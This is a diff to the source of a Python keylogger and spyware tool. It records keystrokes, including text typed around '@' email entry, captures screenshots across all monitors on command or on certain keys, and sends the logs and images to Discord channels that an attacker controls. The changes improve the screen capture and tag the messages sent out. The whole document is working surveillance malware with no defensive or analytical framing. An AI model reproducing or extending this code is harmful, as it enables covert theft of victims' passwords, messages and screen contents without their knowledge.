@@ -3,6 +3,7 @@ from pynput.keyboard import Key, Listener
 from shutil import copy2
 import os
 import sys
+from PIL import ImageGrab
 from getpass import getuser
 import asyncio
 import sounddevice
@@ -66,8 +67,8 @@ async def on_ready():
 async def on_message(message):
     global channel_ids
     if message.content == '.ss':
-        pyautogui.screenshot().save('ss.png')
-        await message.channel.send(embed=discord.Embed(title=current_time()).set_image(url='attachment://ss.png'), file=discord.File('ss.png'))
+        ImageGrab.grab(all_screens=True).save('ss.png')
+        await message.channel.send(embed=discord.Embed(title=current_time() + ' `[On demand]`').set_image(url='attachment://ss.png'), file=discord.File('ss.png'))
         os.system('del ss.png')
     '''
     elif message.content == '.join':
@@ -93,9 +94,8 @@ def on_press(key):
             case Key.backspace: processed_key = ' *`<`*'
             case Key.enter: processed_key = ''; messages_to_send.append([channel_ids['main'], text_buffor + ' *`ENTER`*']); text_buffor = ''
             case Key.print_screen|'@':
-                pyautogui.screenshot().save('ss.png')
+                ImageGrab.grab(all_screens=True).save('ss.png')
                 embeds_to_send.append([channel_ids['main'], current_time() + (' `[Print Screen pressed]`' if processed_key == Key.print_screen else ' `[Email typing]`'), 'ss.png'])
-
         text_buffor += str(processed_key)
         if len(text_buffor) > 1975:
             if 'wwwww' in text_buffor or 'aaaaa' in text_buffor or 'sssss' in text_buffor or 'ddddd' in text_buffor:
